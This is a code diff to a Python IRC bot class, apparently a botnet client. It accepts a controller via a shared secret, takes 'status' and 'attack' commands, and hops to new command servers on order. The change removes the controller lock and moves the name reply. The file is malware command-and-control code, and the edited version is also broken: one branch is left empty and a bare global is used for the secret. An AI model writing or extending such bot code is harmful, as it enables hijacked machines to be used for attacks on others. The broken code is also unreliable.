@@ -15,7 +15,6 @@ class PyBot:
     self.channel = channel
     self.secret = secret
     self.nick = self.generateRandomName()
-    self.controlMode = 0 #default 0 = bot not being controller
     self.controllerName = ""
     self.socket = s
 
@@ -68,18 +67,15 @@ class PyBot:
   def examinePrivmsg(self,senderNick,senderMessage):
 
     print("DEBUG --> "+senderNick+" says:"+senderMessage)
-    #This locks the bot permantely to the controller, if secret is entered again it will be ignored
-    if senderMessage == secret and self.controlMode == 0:
-      print("DEBUG --> Controller said the secret! Control Mode enabled, at your command troll")
-      self.controlMode = 1
+    if senderMessage == secret:
+#      print("DEBUG --> Controller said the secret! Control Mode enabled, at your command troll")
       self.controllerName = senderNick
+      outMessage = "BotName$$: "+self.nick
+      self.socket.send(bytes("PRIVMSG "+self.controllerName+" :"+outMessage+"\n", "UTF-8"))
 
-    elif self.controlMode == 1 and senderNick == self.controllerName: 
+    elif senderNick == self.controllerName: 
       if senderMessage == "status":
-        outMessage = "BotName$$: "+self.nick #parse this on delimiter $$
-#        print("DEBUG --> status requested, sending PRIVMSG: '"+outMessage+"' to user: "+self.controllerName) 
-        #s.send(bytes("PRIVMSG "+self.channel+" :"+outMessage+"\n","UTF-8")) #sends channel message
-        self.socket.send(bytes("PRIVMSG "+self.controllerName+" :"+outMessage+"\n", "UTF-8"))
+        
 
       elif senderMessage.split()[0] == "attack":
 #        print("DEBUG --> attack requested by controller")
@@ -150,7 +146,6 @@ class PyBot:
         self.host = newHost       #Set the new host
         self.port = newPort       #Set the new port
         self.channel = newChannel #Set the new channel
-        self.controlMode = 0      #Reset the controllerMode (bot lock)
         self.controllerName = ""  #Reset the controllerName (as it might change)
         while True:
           try:
